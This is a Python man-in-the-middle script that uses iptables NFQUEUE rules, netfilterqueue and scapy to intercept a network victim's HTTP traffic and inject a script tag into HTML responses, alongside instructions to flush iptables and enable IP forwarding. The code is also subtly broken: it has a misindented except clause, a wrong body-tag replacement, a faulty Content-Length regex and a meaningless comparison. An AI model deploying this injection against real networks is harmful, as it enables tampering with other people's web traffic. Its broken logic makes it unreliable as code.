#!/usr/bin/env python
"""This code runs if you are on the same network as the victim. You need to flush iptables first,
[+] iptables --flush
[+] iptables -I FORWARD -J NFQUEUE --queue-num 0 # This is for remote machines. 
[+] iptables -I INPUT -J NFQUEUE --queue-num 0 # If it was your local machine.
[+] iptables -I OUTPUT -J NFQUEUE --queue-num 0 # If it was your local machine.
You may have to enable ip forwarding in order for packet flowing through your machine,
[+] echo 1 > /proc/sys/net/ipv4/ip_forward"""

import netfilterqueue
import scapy.all as scapy
import re




def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    # After being deleted scapy will automatically calculate these values.
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n","",load)


            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                injection_code = "<script>alert('test');</script>"
                load = load.replace("<body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length\s)(\d*)", load)
                # ?: --> we are using content-length for locating but not a part of the regex.
                if content_length_search and "text/html" in load:
                    # Only inject codes into html pages.
                    # Using this because content-length may not be used in some html codes.
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
                    # replace method looks for a sub string in a bigger string. So it uses str.
                    print(content_length)



            if load != scapy_packet.haslayer(scapy.Raw):
                new_packet = set_load(scapy_packet,load)
                packet.set_payload(bytes(new_packet))
                # This is for running the new modified packet
                # set_payload() expects a bytes-object
         except UnicodeDecodeError:
            pass
        

        packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
        
